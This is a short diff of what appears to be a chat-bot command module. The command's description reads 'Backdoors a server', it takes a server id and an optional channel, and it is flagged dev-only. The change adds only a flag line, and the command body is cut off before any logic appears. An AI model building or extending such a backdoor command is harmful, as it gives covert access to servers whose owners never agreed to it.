@@ -5,6 +5,7 @@ module.exports = {
   description: "Backdoors a server.",
   usage: "<server id> [possible channel]",
   dev: true,
+  sped: true,
   execute(bot, message, args) {
 
     const serverid = args[0]
